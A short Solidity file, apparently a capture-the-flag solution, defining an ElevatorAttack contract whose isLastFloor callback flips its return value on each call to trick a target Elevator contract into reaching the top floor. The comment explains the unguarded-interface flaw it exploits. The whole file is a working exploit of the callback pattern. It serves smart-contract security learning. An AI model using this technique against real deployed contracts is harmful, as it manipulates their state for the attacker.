// SPDX-License-Identifier: MIT
pragma solidity 0.6.0;

import "./Elevator.sol";

contract ElevatorAttack {
    bool public toggle = true;
    Elevator public elevator;

    constructor(address _elevator) public {
        elevator = Elevator(_elevator);
    }

    /*@info in order to solve the challenge, I need to create the code logic
     for the function isLastFloor to attack the smart contracts, because the modifiers in not specified
     ,so I can modifier the state from the blockchain as well as reading(view/read);
    */

    function isLastFloor(uint) external returns(bool) {
        toggle = !toggle;
        return toggle;
    }

    function setGo(uint _floor) public {
        elevator.goTo(_floor);
    }
    
}